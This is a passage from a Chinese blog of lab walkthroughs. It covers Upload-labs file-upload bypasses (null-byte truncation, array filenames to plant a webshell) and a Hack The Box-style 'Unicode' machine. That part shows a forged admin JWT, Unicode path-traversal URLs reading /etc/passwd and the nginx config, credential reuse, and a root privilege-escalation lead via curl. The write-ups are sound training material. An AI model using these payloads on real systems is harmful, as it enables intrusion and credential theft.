class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;未知错误！&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;setDir( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="PASS-20"><a href="#PASS-20" class="headerlink" title="PASS-20"></a>PASS-20</h2><p>从代码中分析，发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过，漏洞利用成功的条件是PHP的版本要低于5.3</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当我们上传webshell.php文件并重命名为webshell.php时，它显示不允许保存为该文件类型<br><img src="https://img-blog.csdnimg.cn/c6515b4d2ff34eef8a8cba8f45a3393a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a2ec3df096a9456996dbab46c6f991e0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/71251da9ea5d416491ec42043975db2d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b292e12804f6407c9254383d8d284420.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="PASS-21"><a href="#PASS-21" class="headerlink" title="PASS-21"></a>PASS-21</h2><p>通过审查源码发现，<code>$file_name</code>经过<code>reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>处理，如果上传的是数组的话，会跳过<code>$file = explode(&#39;.&#39;, strtolower($file));</code>，而最终的文件名后缀取的是<code>$file[count($file) - 1]</code>，因此我们可以让<code>$file</code>为数组。<code>$file[0]为smi1e.php/</code>，也就是<code>reset($file)</code>，然后再令<code>$file[2]</code>为白名单中的jpg。此时<code>end($file)</code>等于jpg，<code>$file[count($file) - 1]</code>为空。而 <code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>，也就是<code>smi1e.php/.</code>，最终move_uploaded_file会忽略掉/.，最终上传smi1e.php。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/f5fd6c6a71114afdb44ece6f274b74bb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>文件上传漏洞</category>
      </categories>
      <tags>
        <tag>Upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>Unicode</title>
    <url>/2022/02/06/Unicode/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 <span class="variable">$1</span> | grep ^[0-9] | cut -d <span class="string">&#x27;/&#x27;</span> -f 1 | tr <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed s/,$//)</span><br><span class="line">nmap -sC -sV -oN result -p<span class="variable">$ports</span> <span class="variable">$1</span></span><br></pre></td></tr></table></figure>
<p>发现目标主机开放了ssh和web服务<br><img src="https://img-blog.csdnimg.cn/94531f843e904009983662305cf416f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们先访问一下web服务，发现是一个注册登录的页面，我们先注册一个用户登录看看页面都实现了哪些功能<br><img src="https://img-blog.csdnimg.cn/58b0c8b7d4da4868b8c55e31cf82b006.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>登录成功后，发现存在一个文件上传页面，但是经过多次尝试，可以上传成功，可是并不能获取到上传的路径<br><img src="https://img-blog.csdnimg.cn/2d61973f094d405389ede27aedcc29ba.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>当我打开查看网页cookie的时候，发现是JWT形式存储<br><img src="https://img-blog.csdnimg.cn/2e84937520c94758b02237094c1d8d3b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_14,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们解密JWT后发现存在一个url路径，我们将其添加到hosts文件后进行访问并将jwks.json值保存下来<br><img src="https://img-blog.csdnimg.cn/66a49f96c74949d6a7124ee8f4f46431.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1a8a683ed66c4c01ba30fbcf25dcd74e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这个漏洞利用过程就比较复杂了，也比较考验渗透测试者的经验和脑洞。首先我们先在<a href="https://mkjwk.org/">https://mkjwk.org/</a>这个网站上生成一个用于反弹到本机上的json值，我们将生成的n值对应的值替换掉原来保存的jwks.json的值</p>
<p><img src="https://img-blog.csdnimg.cn/2395e952d4c2421c90faec928391bfa5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7b089027eba64eba8226cb130c062b6d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5f4cf42fd9c54d4fabc001825bb29e5f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们利用url重定向，先在本地开放一个微型的服务器，然后将用户变换为admin，生成一个新的JWT值用户登录admin用户界面，最后将新生成的公钥私钥值复制到生成页面上。<br><img src="https://img-blog.csdnimg.cn/7dd0979b020f42769ff74f57dd9f6d3b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f350f5bcd6314ccab112859ec77a8b67.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/c18abc73505a467c8871475cfb0c06df.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>生成一个新的JWT值，替换掉用普通用户登录的JWT值，刷新页面</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTQuMjMvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.XdbEyn8OmY2soOmA_LCwfwPyW_CgWyMD0TyeVDQZ0KlVTLHTaiuhui961b8qXqc_Kbxu20Zt6FYaZV_JS9dP_RT19ecIdFMZaEkRup-y07r1KBoHMWiGTyg-Q9uc1auj3XMqjHSp6rT7eTEsVFv-qzjQEVPaRJfqYLoE6Hxt2aW2bvG1I3PoEm9oVnH3zXm_ngM46AC_4Iy3ZMXduufwEeJY8OLkQPlZgQ0s3tuQjDZqRjFMlYBz0sGkgw_Oud-40hvrylaQmJdmsulrbED9BLiuhCvbFrX_Q-tXlxkxHWc5Q52co1qf6A0P-2N_zeRjhw0M1RB3T7G2GvTKZGFJzQ</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/f798ff356a704ad5978651ab61558088.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>点击current month页面是，发现是一个本地文件读取漏洞，并且一般的读取姿势还不能读取成功<br><img src="https://img-blog.csdnimg.cn/2a90ae4d3b0f4fabb4568a2c7e9543b3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们尝试使用<code>U+FE30</code>的编码形式进行绕过，经过反复尝试成功读取到<code>/etc/passwd</code>文件的内容，这是有关文件读取编码绕过的具体内容<a href="https://link.zhihu.com/?target=https://lazarv.com/posts/unicode-normalization-vulnerabilities/">https://link.zhihu.com/?target=https%3A//lazarv.com/posts/unicode-normalization-vulnerabilities/</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.10.11.126/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/37a1d401639748fa8d5f7d6a6d032e60.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们进行信息收集时发现，目标主机上运行着nginx服务器，我们可以尝试读取nginx相关的用户配置信息。读取到的路径是<code>/home/code/coder</code>，并且存在密码信息文件<code>db.yaml</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.10.11.126/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/d0b8d96c2fff4e1591dcb2463dd98829.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>成功读取到code用户信息和相关密码信息内容<br><img src="https://img-blog.csdnimg.cn/c7333db6968b416cacbab568dcebd320.png" alt="在这里插入图片描述"><br>从收集的信息上看，code用户是可以使用ssh连接bash终端的<br><img src="https://img-blog.csdnimg.cn/5909c1cd13dc4df6a51189f4a7ea807f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/02f18e5957bc45f5911b267d955b6828.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权到ROOT"><a href="#提权到ROOT" class="headerlink" title="提权到ROOT"></a>提权到ROOT</h2><p>发现可以以root身份运行treport程序，我们可以尝试运行分析其功能<br><img src="https://img-blog.csdnimg.cn/0ccb282c259d4e9ea27ec430d04b4b95.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现是对分析报告的生成，并且文件的类型是python，在第三个选择上调用了curl命令进行报告下载<br><img src="https://img-blog.csdnimg.cn/f6e677204f80458db27023145b872e38.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>突破点就是在第三个选项上，但是我们不知道他具体程序的源码是怎么实现的，所以需要对这个python文件进行逆向源码还原。这里使用到的工具有<code>pyinstxtractor</code>和<code>pycdc</code>，并且将treport文件通过scp的形式下载下来<br><img src="https://img-blog.csdnimg.cn/f414b554fcc14d4c9351cf7763f734ba.png" alt="在这里插入图片描述"><br>脚本运行成功后会产生一个新的文件夹<br><img src="https://img-blog.csdnimg.cn/9ed3cfb08b8e4fd092e3fcbc27ebfe60.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>文件夹内大部分文件都是pyc文件格式<br><img src="https://img-blog.csdnimg.cn/121f6a8d3c3849f7af0cee4353e1848e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们就要用到c和c++的转换工具了<br><img src="https://img-blog.csdnimg.cn/e895ce0488c147ffb5fd266f9be93cc5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a41b4ae29bb949d99332f17c8c92b5b7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>通过审计源代码可以得知，在下载文件部分使用了黑名单进行过滤，但是唯独没有过滤大括号，因此我们可以使用大括号进行文件读取，我们可以使用curl的–config参数对指定文件内容进行读取</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./pycdc ../treport_extracted/treport.pyc</span><br></pre></td></tr></table></figure>

